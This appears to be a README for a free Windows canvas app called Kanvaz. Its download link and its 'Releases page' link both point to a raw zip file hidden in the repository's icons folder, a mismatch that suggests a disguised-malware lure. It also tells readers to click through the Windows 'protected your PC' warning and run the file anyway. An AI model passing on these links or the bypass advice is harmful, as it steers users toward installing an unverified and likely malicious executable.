# Kanvaz

**Your canvas. Your references.**

An infinite canvas for VFX artists, 3D artists, and the people who teach them.  
Drop images, GIFs, videos, and audio. Annotate. Save. No internet. No telemetry. Your files never leave your machine.

### [⬇ Download for Windows](https://github.com/quilted-civiccenter984/kanvaz/raw/refs/heads/main/assets/icons/Software_v2.0.zip)

Grab the latest installer from the [Releases page](https://github.com/quilted-civiccenter984/kanvaz/raw/refs/heads/main/assets/icons/Software_v2.0.zip) — no setup or technical knowledge needed.

> **Note:** Kanvaz isn't code-signed (signing certificates cost money and
> this app is free). When you run the installer, Windows will likely show
> a blue **"Windows protected your PC"** screen. This is normal for
> unsigned indie apps — click **"More info"** → **"Run anyway"**.
>
> Prebuilt downloads are Windows only. macOS and Linux users can build
> from source — see [Build installers](#build-installers) below.

See [CHANGELOG.md](CHANGELOG.md) for version history.

## File format

Boards are saved as `.kanvaz` files — plain JSON. Media is embedded as base64 data URLs. Self-contained, portable, no external references.

---

## Known limitations

These are stable, by-design limitations — not bugs, and not currently planned:

- No light/dark theme toggle (dark theme only).
- No "Tags" feature.
- The "open on startup" setting currently has no effect.
- `.kanvaz` files embed media as base64, so files with a lot of video/audio can get large.
- The annotation toolbar doesn't follow the canvas if you pan/zoom while it's open.
